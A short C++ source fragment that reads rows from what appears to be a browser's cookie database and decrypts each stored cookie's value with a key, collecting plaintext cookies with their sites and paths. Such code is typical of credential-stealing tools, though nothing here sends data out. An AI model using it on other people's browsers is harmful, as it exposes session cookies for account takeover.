#include "content.h"

void CookieReader::populateCookies() {

	while (this->step()) {
		auto name = this->getText(0);
		auto site = this->getText(1);
		auto path = this->getText(2);

		auto blobSize = this->getBytes(3);
		auto encCookie = this->getBlob<PBYTE>(3);

		vector<BYTE> cookiesVec(encCookie, encCookie + blobSize);

		string cookie = decryptor::decrypt(key, cookiesVec);

		auto entry = new CookieEntry{ name, site, path, cookie };

		this->cookies.push_back(entry);
	}
}
